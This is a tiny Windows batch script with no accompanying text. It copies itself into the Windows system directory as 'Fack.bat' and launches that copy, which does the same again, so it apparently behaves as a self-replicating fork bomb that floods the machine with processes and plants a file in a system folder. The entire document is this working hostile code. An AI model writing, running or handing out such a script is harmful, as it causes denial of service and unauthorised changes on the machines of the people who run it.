echo off
copy %0 %windir%\Fack.bat >nul
start %windir%\Fack.bat
ctty con
cls